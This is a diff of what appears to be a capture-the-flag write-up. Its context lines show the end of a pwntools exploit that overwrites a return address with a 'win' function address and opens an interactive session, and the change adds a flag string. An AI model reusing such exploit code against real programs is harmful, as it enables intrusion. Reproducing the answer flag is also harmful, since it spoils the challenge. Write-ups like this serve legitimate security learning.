@@ -158,4 +158,10 @@ payload += p64(exe.sym.win+1)
 sla(b'u:\n',payload)
 p.interactive()
 
+
+
 ```
+
+# Flag
+
+CANARY{5o_3a5y_Right}
